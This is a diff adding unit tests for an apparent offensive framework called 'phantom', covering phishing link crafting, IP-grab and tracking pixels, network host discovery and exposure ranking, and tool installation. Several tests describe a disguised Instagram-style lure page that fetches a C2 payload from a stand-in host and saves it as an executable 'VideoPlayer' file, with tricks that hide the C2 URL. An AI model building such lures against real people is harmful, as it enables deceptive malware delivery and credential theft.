@@ -1,0 +1,630 @@
+"""Tests for the social-engineering crafting workspace, network mapping,
+tool installation, and the auto-mode QR lure capability."""
+import asyncio
+import os
+import tempfile
+import unittest
+from unittest.mock import MagicMock, patch
+
+from aiohttp.test_utils import TestClient, TestServer
+
+from phantom.api.server import create_app
+from phantom.automation.social.grabbit import GrabLink
+from phantom.modules import craft as craft_mod
+from phantom.utils import c2_crypto
+
+
+class TestCraft(unittest.TestCase):
+
+    def setUp(self):
+        self._saved = os.environ.get("PHANTOM_DATA_DIR")
+        self._tmp = tempfile.mkdtemp(prefix="phantom-craft-")
+        os.environ["PHANTOM_DATA_DIR"] = self._tmp
+
+    def tearDown(self):
+        if self._saved is None:
+            os.environ.pop("PHANTOM_DATA_DIR", None)
+        else:
+            os.environ["PHANTOM_DATA_DIR"] = self._saved
+
+    def _fake_grabber(self):
+        fake = MagicMock()
+        fake.create_link.return_value = GrabLink("https://t.example/abc", "abc")
+        fake.create_video_share_link.return_value = GrabLink("https://t.example/reel/xyz", "xyz")
+        return fake
+
+    def test_craft_ipgrab_returns_paste_ready(self):
+        with patch.object(craft_mod, "_grabber", return_value=self._fake_grabber()):
+            out = craft_mod.craft_ipgrab(label="phish")
+        self.assertTrue(out["created"])
+        self.assertEqual(out["url"], "https://t.example/abc")
+        self.assertEqual(out["code"], "abc")
+        self.assertEqual(out["kind"], "ipgrab")
+
+    def test_craft_pixel_embeds_html(self):
+        with patch.object(craft_mod, "_grabber", return_value=self._fake_grabber()):
+            out = craft_mod.craft_pixel(label="px")
+        self.assertEqual(out["kind"], "pixel")
+        self.assertIn("<img src=\"https://t.example/abc\"", out["html"])
+
+    def test_craft_video_share(self):
+        with patch.object(craft_mod, "_grabber", return_value=self._fake_grabber()):
+            out = craft_mod.craft_video(platform="instagram")
+        self.assertEqual(out["url"], "https://t.example/reel/xyz")
+
+    def test_craft_hits_without_server(self):
+        with patch.object(craft_mod, "_store", return_value=None):
+            self.assertEqual(craft_mod.craft_hits("x"),
+                             {"hits": [], "opens": [], "creds": [],
+                             "sessions": []})
+
+    def test_craft_beacon_requires_listener(self):
+        with patch.object(craft_mod, "_grabber", return_value=self._fake_grabber()):
+            out = craft_mod.craft_beacon(platform="android")
+        self.assertIn("error", out)  # C2 listener not running in tests
+
+    def test_craft_image_hosts_chosen_file(self):
+        img = os.path.join(self._tmp, "photo.jpg")
+        with open(img, "wb") as f:
+            f.write(b"\xff\xd8\xff\xe0FAKEJPEG")
+        server = MagicMock()
+        fake = MagicMock()
+        fake.create_link.return_value = GrabLink("https://t.example/i/img1", "img1")
+        with patch.object(craft_mod, "_grabber", return_value=fake), \
+             patch.object(craft_mod, "_server", return_value=server):
+            out = craft_mod.craft_image(img)
+        self.assertEqual(out["kind"], "image")
+        self.assertIn("https://t.example/i/img1", out["html"])
+        server.register_image.assert_called_once()
+        self.assertEqual(server.register_image.call_args[0][2], "image/jpeg")
+
+    def test_craft_image_missing_file_errors(self):
+        with patch.object(craft_mod, "_grabber", return_value=self._fake_grabber()):
+            out = craft_mod.craft_image("/nonexistent/nope.png")
+        self.assertIn("error", out)
+
+    def test_craft_reel_requires_argument(self):
+        out = craft_mod.craft_reel(arg="")
+        self.assertIn("error", out)
+
+    def test_craft_beacon_is_link_not_qr(self):
+        """The beacon delivery is a reel-looking LINK (camouflaged redirect),
+        never a QR — no 'kind: qr', no PNG path."""
+        with patch.object(craft_mod, "_server") as server, \
+             patch.object(craft_mod, "_tracking_base", return_value="http://127.0.0.1:8099"):
+            out = craft_mod.craft_beacon(platform="android")
+        self.assertIn("error", out)  # no C2 listener in tests
+        self.assertNotIn("kind", out)  # error dict has no lure kind
+        self.assertIsNone(out.get("path"))
+
+    def test_player_page_embeds_payload_and_stealth(self):
+        """The beacon-player delivery page embeds the payload endpoint, the
+        play overlay fetches it under a RUNNABLE name (the extension follows
+        the real format — a PE saved as .mp4 would never execute), and the
+        fail-soft copy shows no C2 exposure when the endpoint is unreachable."""
+        from phantom.automation.social.tracker import _player_page
+        html = _player_page(skin="instagram", video_id="abc123",
+                            code="px1", payload_url="https://c2.example/api/v1/payload",
+                            title="Cool Reel", channel="someuser")
+        self.assertIn('const PAYLOAD="https://c2.example/api/v1/payload";', html)
+        self.assertIn('a.download="VideoPlayer-px1.exe"', html)
+        self.assertNotIn(".mp4", html)
+        # a dead delivery looks like a REMOVED post, not a broken replica
+        self.assertIn("Sorry, this page isn't available", html)
+        self.assertNotIn("Content is loading", html)
+        # the play click must NOT leak the C2 URL into the download UI
+        self.assertIn('URL.createObjectURL(b)', html)
+
+    def test_tracker_register_player_route_served(self):
+        """register_player stores the payload URL and the tracking handler
+        serves the player page at /v/<code> (video-style route)."""
+        from phantom.automation.social.tracker import TrackingServer
+        store = {}
+        srv = TrackingServer(store=store, brand="IG", otp=False, skin="instagram",
+                             video_id="abc", redirect_url="")
+        srv.register_player("pv1", "https://c2.example/api/v1/payload",
+                            meta={"platform": "windows"})
+        self.assertIn("pv1", srv._players)
+        self.assertEqual(srv._players["pv1"]["payload"],
+                         "https://c2.example/api/v1/payload")
+
+    def test_craft_beacon_player_requires_listener(self):
+        """Like craft beacon, the player delivery needs the C2 listener up."""
+        with patch.object(craft_mod, "_grabber", return_value=self._fake_grabber()):
+            out = craft_mod.craft_beacon_player(platform="windows")
+        self.assertIn("error", out)
+
+
+class TestNetmap(unittest.TestCase):
+
+    def test_parse_arp_scan(self):
+        from phantom.core.netmap import _parse_arp_scan
+        hosts = _parse_arp_scan(
+            "10.0.0.1\taa:bb:cc:dd:ee:ff\tRouter Inc.\n"
+            "10.0.0.42\t11:22:33:44:55:66\tPhone Maker\njunk line")
+        self.assertEqual(len(hosts), 2)
+        self.assertEqual(hosts[0]["ip"], "10.0.0.1")
+        self.assertEqual(hosts[0]["vendor"], "Router Inc.")
+
+    def test_parse_nmap_sn(self):
+        from phantom.core.netmap import _parse_nmap_sn
+        hosts = _parse_nmap_sn(
+            "Nmap scan report for 10.0.0.9\n"
+            "MAC Address: AA:BB:CC:00:11:22 (Samsung)\n"
+            "Nmap scan report for 10.0.0.10\n")
+        self.assertEqual(len(hosts), 2)
+        self.assertEqual(hosts[0]["ip"], "10.0.0.9")
+        self.assertEqual(hosts[0]["vendor"], "Samsung")
+
+    def test_discover_network_uses_arp_scan_output(self):
+        import phantom.core.netmap as nm
+        with patch.object(nm, "_run", return_value="10.0.0.7\taa:bb:01:02:03:04\tVendor\n"), \
+             patch.object(nm, "shutil") as sh:
+            sh.which.return_value = "/usr/bin/arp-scan"
+            res = nm.discover_network(target=None, timeout=5)
+        self.assertEqual(res["method"], "arp-scan")
+        self.assertEqual(len(res["hosts"]), 1)
+        self.assertEqual(res["hosts"][0]["ip"], "10.0.0.7")
+
+    def test_seed_worldmodel_writes_host_findings(self):
+        from phantom.core.netmap import seed_worldmodel
+        from phantom.core.knowledge import reset_wm, session_wm
+        reset_wm(target="")
+        n = seed_worldmodel([{"ip": "10.0.0.9", "mac": "aa:bb", "vendor": "X"}])
+        self.assertEqual(n, 1)
+        self.assertTrue(any(f.kind == "host" for f in session_wm().all_findings()))
+
+    def test_seed_worldmodel_carries_enrichment(self):
+        """The scan's per-device fingerprint (OS guess, ports, services)
+        must reach the WorldModel — that is what the map cards render."""
+        from phantom.core.netmap import seed_worldmodel
+        from phantom.core.knowledge import reset_wm, session_wm
+        reset_wm(target="")
+        seed_worldmodel([{"ip": "10.0.0.9", "hostname": "gw", "vendor": "X",
+                          "os_guess": "Linux", "ports": [22, 80],
+                          "services": "ssh, http"}])
+        host = next(f for f in session_wm().all_findings() if f.key == "10.0.0.9")
+        self.assertEqual(host.value.get("os"), "Linux")
+        self.assertEqual(host.value.get("ports"), [22, 80])
+        self.assertIn("ssh", host.value.get("services", ""))
+
+    def test_detect_topology_star_vs_broadcast(self):
+        from phantom.core.netmap import detect_topology
+        # star: many devices, gateway present, only the gateway exposes SMB
+        star = detect_topology([
+            {"ip": "192.168.1.1", "hostname": "modemtim", "ports": [53, 80, 445]},
+            {"ip": "192.168.1.10", "hostname": "pc1", "ports": []},
+            {"ip": "192.168.1.11", "hostname": "pc2", "ports": []},
+            {"ip": "192.168.1.12", "hostname": "pc3", "ports": []},
+            {"ip": "192.168.1.13", "hostname": "pc4", "ports": []},
+        ])
+        self.assertEqual(star["kind"], "star")
+        self.assertEqual(star["gateway"], "192.168.1.1")
+        # broadcast: many hosts expose SMB — flat segment
+        flat = detect_topology([
+            {"ip": "10.0.0.1", "hostname": "gw", "ports": []},
+            {"ip": "10.0.0.2", "hostname": "a", "ports": [445, 139]},
+            {"ip": "10.0.0.3", "hostname": "b", "ports": [445]},
+            {"ip": "10.0.0.4", "hostname": "c", "ports": [139, 445]},
+            {"ip": "10.0.0.5", "hostname": "d", "ports": [445]},
+        ])
+        self.assertEqual(flat["kind"], "broadcast")
+
+    def test_guess_os_from_banner_and_ports(self):
+        from phantom.core.netmap import _guess_os
+        self.assertEqual(_guess_os([3389, 135, 445]), "Windows (likely)")
+        self.assertEqual(_guess_os([22, 111]), "Linux (likely)")
+        self.assertEqual(_guess_os([], "OpenSSH_8.4"), "Linux")
+        self.assertEqual(_guess_os([1900, 53]), "Router/IoT firmware")
+
+    def test_quick_probe_enriches_hosts(self):
+        """_quick_probe_hosts attaches ports/services/os to enriched hosts.
+
+        The claim is the ENRICHMENT SHAPE, so the test provides the one thing
+        the probe can see: a real listener on loopback. It used to assume
+        "the dev environment runs the API server on some port", which made it
+        a statement about the machine it ran on — green on the author's box,
+        `'ports' not found` on every runner and inside a container.
+        """
+        import socket
+        import phantom.core.netmap as nm
+
+        # one of the ports `_quick_probe_hosts` actually probes, bound for
+        # real: the first free candidate wins, so a busy port is not a flake
+        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        bound = None
+        try:
+            for port in (8443, 8080, 8009, 3306, 6379, 5555, 5900):
+                try:
+                    srv.bind(("127.0.0.1", port))
+                    srv.listen(1)
+                    bound = port
+                    break
+                except OSError:
+                    continue
+            self.assertIsNotNone(bound, "no probed loopback port was free")
+            hosts = [{"ip": "127.0.0.1", "hostname": "loopback"}]
+            nm._quick_probe_hosts(hosts, timeout=8)
+            h = hosts[0]
+            self.assertIn("ports", h)
+            self.assertIn("services", h)
+            self.assertIn(bound, h["ports"])
+        finally:
+            srv.close()
+
+
+class TestInstallTool(unittest.TestCase):
+
+    def test_install_tool_runs_and_reports(self):
+        from phantom.core.executor import install_tool
+        fake = MagicMock()
+        fake.returncode = 0
+        fake.stdout = "Setting up hydra..."
+        fake.stderr = ""
+        with patch("subprocess.run", return_value=fake):
+            res = install_tool("hydra", timeout=5)
+        self.assertTrue(res["ok"])
+        self.assertIn("install", res["command"].lower())
+        self.assertIn("hydra", res["command"].lower())
+
+    def test_install_tool_timeout(self):
+        from phantom.core.executor import install_tool
+        import subprocess
+        def _hang(*a, **k):
+            raise subprocess.TimeoutExpired(cmd="x", timeout=1)
+        with patch("subprocess.run", side_effect=_hang):
+            res = install_tool("nmap", timeout=1)
+        self.assertFalse(res["ok"])
+        self.assertIn("timed out", res["output"])
+
+
+class TestCraftApi(unittest.TestCase):
+
+    def setUp(self):
+        self._saved = {k: os.environ.get(k) for k in
+                       ("PHANTOM_STATE_FILE", "PHANTOM_API_TOKEN", "PHANTOM_DATA_DIR")}
+        for k in self._saved:
+            os.environ.pop(k, None)
+        self._tmp = tempfile.mkdtemp(prefix="phantom-craft-api-")
+        os.environ["PHANTOM_DATA_DIR"] = self._tmp
+        os.environ["PHANTOM_STATE_FILE"] = os.path.join(self._tmp, "state.json")
+
+    def tearDown(self):
+        for k, v in self._saved.items():
+            if v is None:
+                os.environ.pop(k, None)
+            else:
+                os.environ[k] = v
+
+    @staticmethod
+    def _scenario(coro):
+        return asyncio.run(coro)
+
+    def test_craft_api_ipgrab(self):
+        async def scenario():
+            import phantom.modules.craft as cm
+            fake = MagicMock()
+            fake.create_link.return_value = GrabLink("https://t.example/link1", "link1")
+            with patch.object(cm, "_grabber", return_value=fake):
+                client = TestClient(TestServer(create_app()))
+                await client.start_server()
+                try:
+                    token = c2_crypto.get_api_token()
+                    headers = {"Authorization": f"Bearer {token}"}
+                    resp = await client.post("/api/craft",
+                                             json={"type": "ipgrab", "label": "api"},
+                                             headers=headers)
+                    self.assertEqual(resp.status, 200)
+                    data = await resp.json()
+                    self.assertEqual(data["url"], "https://t.example/link1")
+                finally:
+                    await client.close()
+
+        self._scenario(scenario())
+
+    def test_craft_api_image_requires_arg(self):
+        async def scenario():
+            client = TestClient(TestServer(create_app()))
+            await client.start_server()
+            try:
+                token = c2_crypto.get_api_token()
+                headers = {"Authorization": f"Bearer {token}"}
+                resp = await client.post("/api/craft", json={"type": "image"},
+                                         headers=headers)
+                return resp.status
+            finally:
+                await client.close()
+
+        self.assertEqual(self._scenario(scenario()), 400)
+
+    def test_preflight_never_lists_phantom_commands(self):
+        """Module action words (deploy-agent, privesc-run, msf-search…) must
+        not appear as installable missing tools — clicking Install on them
+        used to run `apt-get install deploy-agent` ("Unable to locate
+        package deploy-agent")."""
+        async def scenario():
+            client = TestClient(TestServer(create_app()))
+            await client.start_server()
+            try:
+                token = c2_crypto.get_api_token()
+                headers = {"Authorization": f"Bearer {token}"}
+                resp = await client.post(
+                    "/api/session/preflight", json={"module": "exploit"},
+                    headers=headers)
+                self.assertEqual(resp.status, 200)
+                data = await resp.json()
+                tools = [m["tool"] for m in data.get("missing", [])]
+                for bad in ("deploy-agent", "privesc-run", "msf-search",
+                            "run", "execute", "fire", "list-exploits"):
+                    self.assertNotIn(bad, tools,
+                                     f"phantom command {bad} listed as missing")
+            finally:
+                await client.close()
+
+        self._scenario(scenario())
+
+    def test_network_scan_api_seeds_wm(self):
+        async def scenario():
+            import phantom.core.netmap as nm
+            with patch.object(nm, "discover_network", return_value={
+                    "hosts": [{"ip": "10.0.0.5", "mac": "aa:bb", "vendor": "X"}],
+                    "method": "test", "elapsed": 0.1}), \
+                 patch.object(nm, "seed_worldmodel", return_value=1):
+                client = TestClient(TestServer(create_app()))
+                await client.start_server()
+                try:
+                    token = c2_crypto.get_api_token()
+                    headers = {"Authorization": f"Bearer {token}"}
+                    resp = await client.post("/api/network/scan", json={}, headers=headers)
+                    self.assertEqual(resp.status, 200)
+                    data = await resp.json()
+                    self.assertEqual(len(data["hosts"]), 1)
+                    self.assertEqual(data["seeded"], 1)
+                finally:
+                    await client.close()
+
+    def test_enriched_hosts_have_names(self):
+        """Discovered devices must be identifiable: never a bare 'unknown'.
+        Regression for the Electron map rendering anonymous IP cards."""
+        from phantom.core.netmap import discover_network, _LAST_SCAN
+        _LAST_SCAN.clear()
+        try:
+            res = discover_network(timeout=60)
+        finally:
+            _LAST_SCAN.clear()
+        hosts = res.get("hosts", [])
+        if not hosts:
+            self.skipTest("no live hosts on this network")
+        for h in hosts:
+            name = h.get("hostname") or ""
+            self.assertTrue(name, f"{h.get('ip')} has no hostname fallback")
+            self.assertNotIn("unknown", name.lower())
+
+    def test_windows_install_never_uses_sudo(self):
+        """On Windows the install path must route apt through WSL root —
+        a raw `sudo apt-get ...` hits Win11's disabled native sudo.exe and
+        dies with 'Sudo è disabilitato in questo computer'."""
+        import sys as _sys
+        from phantom.core import executor as ex
+        fake = MagicMock()
+        fake.returncode = 0
+        fake.stdout = "ok"
+        fake.stderr = ""
+        captured = {}
+
+        def _spy(cmdline, *a, **k):
+            captured["cmd"] = cmdline
+            return fake
+
+        orig_platform = _sys.platform
+        try:
+            _sys.platform = "win32"
+            with patch.object(_sys, "platform", "win32"), \
+                 patch("phantom.automation.runtime.toolchain._wsl_distro_list",
+                       return_value=["kali-linux"]), \
+                 patch("subprocess.run", side_effect=_spy):
+                res = ex.install_tool("hydra", timeout=5)
+        finally:
+            _sys.platform = orig_platform
+        self.assertTrue(res["ok"])
+        cmd = str(captured.get("cmd", ""))
+        self.assertNotIn("sudo", cmd.lower(), f"sudo leaked into Windows install: {cmd}")
+        self.assertIn("wsl", cmd.lower())
+        self.assertIn("hydra", cmd.lower())
+
+    def test_preflight_payload_never_lists_handler(self):
+        """payload's suggestion group contains `handler <port> <payload>` —
+        'handler' is a Phantom module, never an installable package."""
+        async def scenario():
+            from phantom.api.server import session_preflight
+
+            class Req:
+                async def json(self):
+                    return {"module": "payload"}
+
+            resp = await session_preflight(Req())
+            import json
+            data = json.loads(resp.body)
+            tools = [m["tool"] for m in data.get("missing", [])]
+            for bad in ("handler", "payload", "scan", "osint", "web",
+                        "exploit", "brute", "pivot", "analyzer",
+                        "report", "wordlist", "wifi", "generate",
+                        "deploy", "privesc"):
+                self.assertNotIn(bad, tools,
+                                 f"{bad} listed as installable tool")
+
+        self._scenario(scenario())
+
+    def test_exposure_rank_excludes_self_and_sorts(self):
+        """rank_hosts_exposure skips the local machine and sorts by score
+        descending with weighted risky services."""
+        from phantom.core.netmap import rank_hosts_exposure
+
+        hosts = [
+            {"ip": "127.0.0.1", "hostname": "me"},
+            {"ip": "10.9.9.1", "hostname": "gateway"},
+            {"ip": "10.9.9.2", "hostname": "iot"},
+        ]
+        open_map = {
+            "10.9.9.1": [22, 445, 3389],   # ssh + smb + rdp
+            "10.9.9.2": [80],              # just a web port
+        }
+        with patch("phantom.core.netmap._probe_ports",
+                   side_effect=lambda ip, ports, **kw: open_map.get(ip, [])):
+            ranked = rank_hosts_exposure(hosts, timeout=10)
+        ips = [r["ip"] for r in ranked]
+        self.assertNotIn("127.0.0.1", ips)
+        self.assertEqual(ips, ["10.9.9.1", "10.9.9.2"])
+        self.assertGreater(ranked[0]["score"], ranked[1]["score"])
+        self.assertEqual(ranked[0]["risk"], "CRITICAL")
+        self.assertEqual(ranked[0]["open_ports"][0]["service"], "ssh")
+
+
+class TestHostStore(unittest.TestCase):
+    """The discovered-host store is a CACHE, not an inventory.
+
+    Without an expiry a device that left the network kept its slot forever,
+    and every consumer (map, exposure ranking) shows a bounded slice — so the
+    stale laptop crowded out the phone that had just answered. Live evidence:
+    the map listed 14 devices of which the /32 targets were unreachable and
+    the list was served from a store written days earlier.
+    """
+
+    def setUp(self):
+        self._saved = os.environ.get("PHANTOM_DATA_DIR")
+        self._tmp = tempfile.mkdtemp(prefix="phantom-hoststore-")
+        os.environ["PHANTOM_DATA_DIR"] = self._tmp
+
+    def tearDown(self):
+        if self._saved is None:
+            os.environ.pop("PHANTOM_DATA_DIR", None)
+        else:
+            os.environ["PHANTOM_DATA_DIR"] = self._saved
+
+    @staticmethod
+    def _stamp(days_ago: float) -> str:
+        from datetime import datetime, timedelta
+        return (datetime.utcnow() - timedelta(days=days_ago)).isoformat()
+
+    def test_age_of_an_undated_entry_is_zero(self):
+        """No timestamp must not read as 'ancient': dropping undated entries
+        would throw away devices we simply have not dated yet."""
+        from phantom.core.netmap import _host_age_days
+        self.assertEqual(_host_age_days({}), 0.0)
+        self.assertEqual(_host_age_days({"last_seen": ""}), 0.0)
+        self.assertEqual(_host_age_days({"last_seen": "not-a-date"}), 0.0)
+
+    def test_age_counts_days_since_last_seen(self):
+        from phantom.core.netmap import _host_age_days
+        self.assertAlmostEqual(
+            _host_age_days({"last_seen": self._stamp(3)}), 3.0, places=1)
+
+    def test_ttl_is_a_positive_bound(self):
+        from phantom.core.netmap import HOST_STORE_TTL_DAYS
+        self.assertGreater(HOST_STORE_TTL_DAYS, 0)
+
+    def test_save_drops_stale_entries(self):
+        from phantom.core.netmap import (HOST_STORE_TTL_DAYS, load_discovered_hosts,
+                                         save_discovered_hosts)
+        save_discovered_hosts([
+            {"ip": "10.0.0.1", "hostname": "ancient",
+             "last_seen": self._stamp(HOST_STORE_TTL_DAYS + 5)},
+        ])
+        self.assertEqual(load_discovered_hosts(), [])
+
+    def test_save_keeps_fresh_entries_and_merges_by_ip(self):
+        from phantom.core.netmap import load_discovered_hosts, save_discovered_hosts
+        save_discovered_hosts([{"ip": "10.0.0.2", "vendor": "Samsung",
+                                "last_seen": self._stamp(0.1)}])
+        # a later sweep of the same device adds fields without losing the old
+        save_discovered_hosts([{"ip": "10.0.0.2", "hostname": "phone",
+                                "last_seen": self._stamp(0.0)}])
+        rows = load_discovered_hosts()
+        self.assertEqual(len(rows), 1)
+        self.assertEqual(rows[0]["vendor"], "Samsung")
+        self.assertEqual(rows[0]["hostname"], "phone")
+
+    def test_load_returns_most_recent_first(self):
+        from phantom.core.netmap import load_discovered_hosts, save_discovered_hosts
+        save_discovered_hosts([
+            {"ip": "10.0.0.3", "last_seen": self._stamp(4)},
+            {"ip": "10.0.0.4", "last_seen": self._stamp(0.5)},
+            {"ip": "10.0.0.5", "last_seen": self._stamp(2)},
+        ])
+        self.assertEqual([h["ip"] for h in load_discovered_hosts()],
+                         ["10.0.0.4", "10.0.0.5", "10.0.0.3"])
+
+
+class TestNetworkMapEndpoint(unittest.TestCase):
+    """`/api/network-map` serves a BOUNDED slice: what it shows must be the
+    freshest devices, and what it hides must be reported.
+
+    Live evidence (2026-10-16): the panel rendered 14 devices of which the two
+    /32 targets were not among the ones actually re-scanned, and nothing in
+    the payload said a device had been left out.
+    """
+
+    def setUp(self):
+        self._saved = os.environ.get("PHANTOM_DATA_DIR")
+        self._tmp = tempfile.mkdtemp(prefix="phantom-mapend-")
+        os.environ["PHANTOM_DATA_DIR"] = self._tmp
+
+    def tearDown(self):
+        if self._saved is None:
+            os.environ.pop("PHANTOM_DATA_DIR", None)
+        else:
+            os.environ["PHANTOM_DATA_DIR"] = self._saved
+
+    @staticmethod
+    def _scenario(coro):
+        return asyncio.run(coro)
+
+    def _seed(self, pairs):
+        from phantom.core.knowledge import reset_wm
+        from phantom.core.netmap import seed_worldmodel
+        reset_wm(target="")
+        seed_worldmodel([{"ip": ip, "hostname": f"dev{n}", "last_seen": seen}
+                         for n, (ip, seen) in enumerate(pairs)])
+
+    def _map(self):
+        async def scenario():
+            client = TestClient(TestServer(create_app()))
+            await client.start_server()
+            # `create_app` may restore a persisted engagement target; this
+            # test measures host ordering/truncation, not the target aura.
+            from phantom.core import session as session_mod
+            saved_target = session_mod.session.target
+            session_mod.session.target = ""
+            try:
+                token = c2_crypto.get_api_token()
+                resp = await client.get(
+                    "/api/network-map",
+                    headers={"Authorization": f"Bearer {token}"})
+                self.assertEqual(resp.status, 200)
+                return await resp.json()
+            finally:
+                session_mod.session.target = saved_target
+                await client.close()
+
+        return self._scenario(scenario())
+
+    def test_hosts_come_back_freshest_first(self):
+        self._seed([("10.0.0.1", "2026-01-01T00:00:00"),
+                    ("10.0.0.2", "2026-03-01T00:00:00"),
+                    ("10.0.0.3", "2026-02-01T00:00:00")])
+        data = self._map()
+        ips = [n["meta"]["ip"] for n in data["nodes"] if n["type"] == "host"]
+        self.assertEqual(ips, ["10.0.0.2", "10.0.0.3", "10.0.0.1"])
+        self.assertEqual(data["hosts_total"], 3)
+        self.assertEqual(data["hosts_shown"], 3)
+
+    def test_truncation_is_reported_and_keeps_the_freshest(self):
+        import phantom.api.server as srv
+        self._seed([(f"10.0.0.{i}", f"2026-01-0{i}T00:00:00") for i in range(1, 5)])
+        with patch.object(srv, "_MAP_MAX_HOSTS", 2):
+            data = self._map()
+        self.assertEqual(data["hosts_total"], 4)
+        self.assertEqual(data["hosts_shown"], 2)
+        ips = [n["meta"]["ip"] for n in data["nodes"] if n["type"] == "host"]
+        self.assertEqual(ips, ["10.0.0.4", "10.0.0.3"])
